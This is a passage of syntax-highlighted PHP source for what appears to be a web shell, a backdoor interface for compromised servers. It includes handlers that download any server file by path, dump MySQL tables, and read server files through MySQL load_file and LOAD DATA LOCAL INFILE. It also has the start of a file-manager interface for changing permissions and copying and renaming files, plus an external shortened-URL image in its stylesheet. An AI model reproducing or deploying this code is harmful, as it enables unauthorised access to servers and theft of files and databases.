<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">errmsg</span> = <span style="color: #99ffff;">'phpinfo() function has non-permissible'</span>;
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'downfile'</span> &amp;&amp; $<span style="color: #ffeead;">thefile</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!@<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">thefile</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">errmsg</span> = <span style="color: #99ffff;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fileinfo</span> = <span style="color: #ffffff; background-color: #002451;">pathinfo(</span>$<span style="color: #ffeead;">thefile</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Content-type: application/x-'</span>.$<span style="color: #ffeead;">fileinfo</span>[<span style="color: #99ffff;">'extension'</span>]);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #ffeead;">fileinfo</span>[<span style="color: #99ffff;">'basename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Content-Length: '</span>.<span style="color: #ffffff; background-color: #002451;">filesize(</span>$<span style="color: #ffeead;">thefile</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">readfile(</span>$<span style="color: #ffeead;">thefile</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'backupmysql'</span> &amp;&amp; !$<span style="color: #ffeead;">saveasfile</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!$<span style="color: #ffeead;">table</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">errmsg</span> =<span style="color: #99ffff;">'Please choose the table'</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>, $<span style="color: #ffeead;">dbuser</span>, $<span style="color: #ffeead;">dbpass</span>, $<span style="color: #ffeead;">dbname</span>, $<span style="color: #ffeead;">charset</span>, $<span style="color: #ffeead;">dbp</span><span style="color: #ffeead; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filename</span> = <span style="color: #ffffff; background-color: #002451;">basename(</span>$<span style="color: #ffeead;">dbname</span>.<span style="color: #99ffff;">'.sql'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Content-type: application/unknown'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #ffeead;">filename</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">table</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">k</span> =&gt; $<span style="color: #ffeead;">v</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">v</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">sqldumptable(</span>$<span style="color: #ffeead;">v</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">mysql_close(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;</span>
<span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">doing</span>==<span style="color: #99ffff;">'mysqldown'</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!$<span style="color: #ffeead;">dbname</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">errmsg</span> = <span style="color: #99ffff;">'Please input dbname'</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mysqllink</span> = <span style="color: #ffffff; background-color: #002451;">mydbconn(</span>$<span style="color: #ffeead;">dbhost</span>, $<span style="color: #ffeead;">dbuser</span>, $<span style="color: #ffeead;">dbpass</span>, $<span style="color: #ffeead;">dbname</span>, $<span style="color: #ffeead;">charset</span>, $<span style="color: #ffeead;">dbp</span><span style="color: #ffeead; text-decoration: underline;">ort</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">mysqldlfile</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">errmsg</span> = <span style="color: #99ffff;">'The file you want Downloadable was nonexistent'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"select load_file('$mysqldlfile');"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!$<span style="color: #ffeead;">result</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"DROP TABLE IF EXISTS tmp_angel;"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"LOAD DATA LOCAL INFILE '"</span>.<span style="color: #ffffff; background-color: #002451;">addslashes(</span>$<span style="color: #ffeead;">mysqldlfile</span>).<span style="color: #99ffff;">"' INTO TA</span><span style="color: #99ffff; text-decoration: underline;">BLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"select content from tmp_angel"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"DROP TABLE tmp_angel"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">row</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_fetch_array(</span>$<span style="color: #ffeead;">result</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!$<span style="color: #ffeead;">row</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">errmsg</span> = <span style="color: #99ffff;">'Load file failed '</span>.<span style="color: #ffffff; background-color: #002451;">mysql_error(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fileinfo</span> = <span style="color: #ffffff; background-color: #002451;">pathinfo(</span>$<span style="color: #ffeead;">mysqldlfile</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Content-type: application/x-'</span>.$<span style="color: #ffeead;">fileinfo</span>[<span style="color: #99ffff;">'extension'</span>]);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">'Content-Disposition: attachment; filename='</span>.$<span style="color: #ffeead;">fileinfo</span>[<span style="color: #99ffff;">'b</span><span style="color: #99ffff; text-decoration: underline;">asename'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">header(</span><span style="color: #99ffff;">"Accept-Length: "</span>.<span style="color: #ffffff; background-color: #002451;">strlen(</span>$<span style="color: #ffeead;">row</span>[<span style="color: #ffffff; background-color: #002451;">0</span>]));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">row</span>[<span style="color: #ffffff; background-color: #002451;">0</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">exit</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #ebbbff;">?&gt;</span>
<span style="color: #bbdaff;">&lt;html&gt;</span>
<span style="color: #bbdaff;">&lt;head&gt;</span>
<span style="color: #bbdaff;">&lt;meta</span> <span style="color: #ff9da4; font-weight: bold;">http</span>-<span style="color: #ff9da4; font-weight: bold;">equiv</span>=<span style="color: #99ffff;">"Content-Type"</span> <span style="color: #bbdaff;">content=</span><span style="color: #99ffff;">"text/html; charset=gbk"</span><span style="color: #bbdaff;">&gt;</span>
<span style="color: #bbdaff;">&lt;title&gt;</span><span style="color: #ebbbff;">&lt;?php</span> <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">action</span>.<span style="color: #99ffff;">' - '</span>.$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'HTTP_HOST'</span>];<span style="color: #ebbbff;">?&gt;</span><span style="color: #bbdaff;">&lt;/title&gt;</span>
<span style="color: #bbdaff;">&lt;style</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"text/css"</span><span style="color: #bbdaff;">&gt;</span>
<span style="color: #ff9da4; font-weight: bold;">body</span>,<span style="color: #ff9da4; font-weight: bold;">td</span>{<span style="color: #ff9da4; font-weight: bold;">font</span>: <span style="color: #ffffff; background-color: #002451;">12</span>px <span style="color: #ff9da4; font-weight: bold;">Arial</span>,<span style="color: #ff9da4; font-weight: bold;">Tahoma</span>;<span style="color: #ff9da4; font-weight: bold;">line</span>-<span style="color: #ff9da4; font-weight: bold;">height</span>: <span style="color: #ffffff; background-color: #002451;">16</span>px;}
.<span style="color: #ff9da4; font-weight: bold;">input</span>{<span style="color: #ff9da4; font-weight: bold;">font</span>:<span style="color: #ffffff; background-color: #002451;">12</span>px <span style="color: #ff9da4; font-weight: bold;">Arial</span>,<span style="color: #ff9da4; font-weight: bold;">Tahoma</span>;<span style="color: #ff9da4; font-weight: bold;">background</span>:<span style="color: #7285b7; font-style: italic;">#fff;border: 1px solid #666;padding:2px</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">;height:22px;}</span>
.<span style="color: #ff9da4; font-weight: bold;">area</span>{<span style="color: #ff9da4; font-weight: bold;">font</span>:<span style="color: #ffffff; background-color: #002451;">12</span>px <span style="color: #99ffff;">'Courier New'</span>, <span style="color: #ff9da4; font-weight: bold;">Monospace</span>;<span style="color: #ff9da4; font-weight: bold;">background</span>:<span style="color: #7285b7; font-style: italic;">#fff;border: 1px solid #666;</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">padding:2px;}</span>
.<span style="color: #ff9da4; font-weight: bold;">bt</span> {<span style="color: #ff9da4; font-weight: bold;">border</span>-<span style="color: #ff9da4; font-weight: bold;">color</span>:<span style="color: #7285b7; font-style: italic;">#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#fff</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">fff;font:12px Arial,Tahoma;height:22px;}</span>
<span style="color: #ff9da4; font-weight: bold;">a</span> {<span style="color: #ff9da4; font-weight: bold;">color</span>: <span style="color: #7285b7; font-style: italic;">#00f;text-decoration:underline;}</span>
<span style="color: #ff9da4; font-weight: bold;">a</span>:<span style="color: #ff9da4; font-weight: bold;">hover</span>{<span style="color: #ff9da4; font-weight: bold;">color</span>: <span style="color: #7285b7; font-style: italic;">#f00;text-decoration:none;}</span>
.<span style="color: #ff9da4; font-weight: bold;">alt1</span> <span style="color: #ff9da4; font-weight: bold;">td</span>{<span style="color: #ff9da4; font-weight: bold;">border</span>-<span style="color: #ff9da4; font-weight: bold;">top</span>:<span style="color: #ffffff; background-color: #002451;">1</span>px <span style="color: #ff9da4; font-weight: bold;">solid</span> <span style="color: #7285b7; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f1f1</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">f1;padding:5px 15px 5px 5px;}</span>
.<span style="color: #ff9da4; font-weight: bold;">alt2</span> <span style="color: #ff9da4; font-weight: bold;">td</span>{<span style="color: #ff9da4; font-weight: bold;">border</span>-<span style="color: #ff9da4; font-weight: bold;">top</span>:<span style="color: #ffffff; background-color: #002451;">1</span>px <span style="color: #ff9da4; font-weight: bold;">solid</span> <span style="color: #7285b7; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#f9f9</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">f9;padding:5px 15px 5px 5px;}</span>
.<span style="color: #ff9da4; font-weight: bold;">focus</span> <span style="color: #ff9da4; font-weight: bold;">td</span>{<span style="color: #ff9da4; font-weight: bold;">border</span>-<span style="color: #ff9da4; font-weight: bold;">top</span>:<span style="color: #ffffff; background-color: #002451;">1</span>px <span style="color: #ff9da4; font-weight: bold;">solid</span> <span style="color: #7285b7; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#fff</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">faa;padding:5px 15px 5px 5px;}</span>
.<span style="color: #ff9da4; font-weight: bold;">head</span> <span style="color: #ff9da4; font-weight: bold;">td</span>{<span style="color: #ff9da4; font-weight: bold;">border</span>-<span style="color: #ff9da4; font-weight: bold;">top</span>:<span style="color: #ffffff; background-color: #002451;">1</span>px <span style="color: #ff9da4; font-weight: bold;">solid</span> <span style="color: #7285b7; font-style: italic;">#fff;border-bottom:1px solid #ddd;background:#e9e9</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">e9;padding:5px 15px 5px 5px;font-weight:bold;}</span>
.<span style="color: #ff9da4; font-weight: bold;">head</span> <span style="color: #ff9da4; font-weight: bold;">td</span> <span style="color: #ff9da4; font-weight: bold;">span</span>{<span style="color: #ff9da4; font-weight: bold;">font</span>-<span style="color: #ff9da4; font-weight: bold;">weight</span>:<span style="color: #ff9da4; font-weight: bold;">normal</span>;}
.<span style="color: #ff9da4; font-weight: bold;">infolist</span> {<span style="color: #ff9da4; font-weight: bold;">padding</span>:<span style="color: #ffffff; background-color: #002451;">10</span>px;<span style="color: #ff9da4; font-weight: bold;">margin</span>:<span style="color: #ffffff; background-color: #002451;">10</span>px <span style="color: #ffffff; background-color: #002451;">0</span> <span style="color: #ffffff; background-color: #002451;">20</span>px <span style="color: #ffffff; background-color: #002451;">0</span>;<span style="color: #ff9da4; font-weight: bold;">background</span>:<span style="color: #7285b7; font-style: italic;">#F1F1F1;border:1px solid</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;"> #ddd;}</span>
<span style="color: #ff9da4; font-weight: bold;">form</span>{<span style="color: #ff9da4; font-weight: bold;">margin</span>:<span style="color: #ffffff; background-color: #002451;">0</span>;<span style="color: #ff9da4; font-weight: bold;">padding</span>:<span style="color: #ffffff; background-color: #002451;">0</span>;}
<span style="color: #ff9da4; font-weight: bold;">h2</span>{<span style="color: #ff9da4; font-weight: bold;">margin</span>:<span style="color: #ffffff; background-color: #002451;">0</span>;<span style="color: #ff9da4; font-weight: bold;">padding</span>:<span style="color: #ffffff; background-color: #002451;">0</span>;<span style="color: #ff9da4; font-weight: bold;">height</span>:<span style="color: #ffffff; background-color: #002451;">24</span>px;<span style="color: #ff9da4; font-weight: bold;">line</span>-<span style="color: #ff9da4; font-weight: bold;">height</span>:<span style="color: #ffffff; background-color: #002451;">24</span>px;<span style="color: #ff9da4; font-weight: bold;">font</span>-<span style="color: #ff9da4; font-weight: bold;">size</span>:<span style="color: #ffffff; background-color: #002451;">14</span>px;<span style="color: #ff9da4; font-weight: bold;">color</span>:<span style="color: #7285b7; font-style: italic;">#5B686F;</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">}</span>
<span style="color: #ff9da4; font-weight: bold;">ul</span>.<span style="color: #ff9da4; font-weight: bold;">info</span> <span style="color: #ff9da4; font-weight: bold;">li</span>{<span style="color: #ff9da4; font-weight: bold;">margin</span>:<span style="color: #ffffff; background-color: #002451;">0</span>;<span style="color: #ff9da4; font-weight: bold;">color</span>:<span style="color: #7285b7; font-style: italic;">#444;line-height:24px;height:24px;}</span>
<span style="color: #ff9da4; font-weight: bold;">u</span>{<span style="color: #ff9da4; font-weight: bold;">text</span>-<span style="color: #ff9da4; font-weight: bold;">decoration</span>: <span style="color: #ff9da4; font-weight: bold;">none</span>;<span style="color: #ff9da4; font-weight: bold;">color</span>:<span style="color: #7285b7; font-style: italic;">#777;float:left;display:block;width:150px;margin-r</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">ight:10px;}</span>
.<span style="color: #ff9da4; font-weight: bold;">drives</span>{<span style="color: #ff9da4; font-weight: bold;">padding</span>:<span style="color: #ffffff; background-color: #002451;">5</span>px;}
.<span style="color: #ff9da4; font-weight: bold;">drives</span> <span style="color: #ff9da4; font-weight: bold;">span</span> {<span style="color: #ff9da4; font-weight: bold;">margin</span>:<span style="color: #ff9da4; font-weight: bold;">auto</span> <span style="color: #ffffff; background-color: #002451;">7</span>px;}
<span style="color: #bbdaff;">&lt;/style&gt;</span>
<span style="color: #bbdaff;">&lt;script</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"text/javascript"</span><span style="color: #bbdaff;">&gt;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">CheckAll</span>(<span style="color: #ff9da4; font-weight: bold;">form</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>(<span style="color: #d1f1a9;">var</span> <span style="color: #ff9da4; font-weight: bold;">i</span>=<span style="color: #ffffff; background-color: #002451;">0</span>;<span style="color: #ff9da4; font-weight: bold;">i</span><span style="color: #bbdaff;">&lt;form</span>.<span style="color: #ff9da4; font-weight: bold;">elements</span>.<span style="color: #ff9da4; font-weight: bold;">length</span>;<span style="color: #ff9da4; font-weight: bold;">i</span>++) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">var</span> <span style="color: #ff9da4; font-weight: bold;">e</span> = <span style="color: #ff9da4; font-weight: bold;">form</span>.<span style="color: #ffffff; background-color: #002451;">elements[</span><span style="color: #ff9da4; font-weight: bold;">i</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">e</span>.<span style="color: #ff9da4; font-weight: bold;">name</span> != <span style="color: #99ffff;">'chkall'</span>)
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">e</span>.<span style="color: #ff9da4; font-weight: bold;">checked</span> = <span style="color: #ff9da4; font-weight: bold;">form</span>.<span style="color: #ff9da4; font-weight: bold;">chkall</span>.<span style="color: #ff9da4; font-weight: bold;">checked</span>;
<span style="background-color: #003f8e;"> </span>   }
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">$</span>(<span style="color: #ff9da4; font-weight: bold;">id</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ff9da4; font-weight: bold;">document</span>.<span style="color: #ffffff; background-color: #002451;">getElementById(</span><span style="color: #ff9da4; font-weight: bold;">id</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">createdir</span>(){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">var</span> <span style="color: #ff9da4; font-weight: bold;">newdirname</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">newdirname</span> = <span style="color: #ffffff; background-color: #002451;">prompt(</span><span style="color: #99ffff;">'Please input the directory name:'</span>, <span style="color: #99ffff;">''</span>  );
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ff9da4; font-weight: bold;">newdirname</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'createdir'</span>).<span style="color: #ff9da4; font-weight: bold;">newdirname</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">newdirname</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'createdir'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">fileperm</span>(<span style="color: #ff9da4; font-weight: bold;">pfile</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">var</span> <span style="color: #ff9da4; font-weight: bold;">newperm</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">newperm</span> = <span style="color: #ffffff; background-color: #002451;">prompt(</span><span style="color: #99ffff;">'Current file:'</span>+<span style="color: #ff9da4; font-weight: bold;">pfile</span>+<span style="color: #99ffff;">'\nPlease input new attribute:'</span>, <span style="color: #99ffff;">''</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ff9da4; font-weight: bold;">newperm</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'fileperm'</span>).<span style="color: #ff9da4; font-weight: bold;">newperm</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">newperm</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'fileperm'</span>).<span style="color: #ff9da4; font-weight: bold;">pfile</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">pfile</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'fileperm'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">copyfile</span>(<span style="color: #ff9da4; font-weight: bold;">sname</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">var</span> <span style="color: #ff9da4; font-weight: bold;">tofile</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">tofile</span> = <span style="color: #ffffff; background-color: #002451;">prompt(</span><span style="color: #99ffff;">'Original file:'</span>+<span style="color: #ff9da4; font-weight: bold;">sname</span>+<span style="color: #99ffff;">'\nPlease input object file (fullpath</span><span style="color: #99ffff; text-decoration: underline;">):'</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ff9da4; font-weight: bold;">tofile</span>) <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'copyfile'</span>).<span style="color: #ff9da4; font-weight: bold;">tofile</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">tofile</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'copyfile'</span>).<span style="color: #ff9da4; font-weight: bold;">sname</span>.<span style="color: #ff9da4; font-weight: bold;">value</span>=<span style="color: #ff9da4; font-weight: bold;">sname</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'copyfile'</span>).<span style="color: #ffffff; background-color: #002451;">submit(</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">rename</span>(<span style="color: #ff9da4; font-weight: bold;">oldname</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">var</span> <span style="color: #ff9da4; font-weight: bold;">newfilename</span>;
